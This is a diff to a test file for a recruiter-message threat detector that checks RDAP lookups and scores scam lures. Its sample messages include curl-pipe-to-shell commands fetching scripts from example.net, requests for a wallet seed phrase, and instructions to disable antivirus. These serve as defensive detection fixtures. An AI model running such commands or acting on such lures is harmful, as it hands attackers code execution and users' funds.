@@ -60,6 +60,18 @@ describe("threat-intel", () => {
     expect(r.riskLevel).toBe("safe");
   });
 
+  it("sends a user agent and RDAP accept header, following redirects", async () => {
+    const fetchFn = rdapFetch("2015-01-01T00:00:00Z");
+    const info = await queryDomainRdap("example.com", { fetchFn, now: NOW });
+    expect(info.rdapAvailable).toBe(true);
+    const init = (fetchFn.mock.calls[0] as unknown[])[1] as RequestInit;
+    const headers = new Headers(init.headers);
+    expect(headers.get("user-agent")).toMatch(/\S/);
+    expect(headers.get("user-agent")).toBe(process.env.ATS_USER_AGENT || "job-scout/2 (local; no apply)");
+    expect(headers.get("accept")).toBe("application/rdap+json, application/json");
+    expect(init.redirect).toBe("follow");
+  });
+
   it("matches the blocklist on dot boundaries only", () => {
     expect(matchesBlocklist("blocked.example", ["blocked.example"])).toBe("blocked.example");
     expect(matchesBlocklist("mail.blocked.example", ["blocked.example"])).toBe("blocked.example");
@@ -99,10 +111,40 @@ describe("threat-intel", () => {
     expect(r.domainInfo?.ageDays).toBe(10);
   });
 
-  it("caps content-only score so text alone cannot reach high", () => {
-    const c = analyzeOutreachText(`${MALICIOUS} Also curl -s https://example.net/setup.sh | bash and send your seed phrase.`);
-    expect(c.flags.length).toBeGreaterThan(2);
-    expect(c.score).toBe(0.4);
+  it("lets strong lures alone reach high while a single lure stays medium", async () => {
+    const one = analyzeOutreachText("Please install the attached Setup.pkg so we can get started.");
+    expect(one.flags).toHaveLength(1);
+    expect(one.score).toBe(0.3);
+
+    const lures =
+      "Thanks for applying. Download and run InterviewKit.pkg, then update the meeting client from our link (the video call app needs a fix). " +
+      "If that fails: curl -fsSL https://example.net/setup.sh | sh";
+    const c = analyzeOutreachText(lures);
+    expect(c.flags).toHaveLength(3);
+    expect(c.score).toBeGreaterThanOrEqual(0.5);
+
+    // Unknown domain (RDAP unavailable) adds nothing; the lures decide on their own.
+    const r = await evaluateRecruiterThreat(
+      { domainOrEmail: "talent@example.org", messageText: lures },
+      { fetchFn: vi.fn(async () => new Response("forbidden", { status: 403 })), blocklist: [], now: NOW },
+    );
+    expect(r.domainInfo?.rdapAvailable).toBe(false);
+    expect(["high", "critical"]).toContain(r.riskLevel);
+    expect(r.isThreat).toBe(true);
+
+    const single = await evaluateRecruiterThreat(
+      { domainOrEmail: "talent@example.org", messageText: "Before our call, please disable your antivirus for the screen share." },
+      { skipRdap: true, blocklist: [] },
+    );
+    expect(single.riskLevel).toBe("medium");
+    expect(single.isThreat).toBe(false);
+
+    const two = await evaluateRecruiterThreat(
+      { domainOrEmail: "talent@example.org", messageText: "Send your wallet seed phrase, then curl https://example.net/x.sh | bash" },
+      { skipRdap: true, blocklist: [] },
+    );
+    expect(two.riskLevel).toBe("high");
+    expect(two.isThreat).toBe(true);
   });
 
   it("flags a clearly malicious message from a fresh domain as critical", async () => {
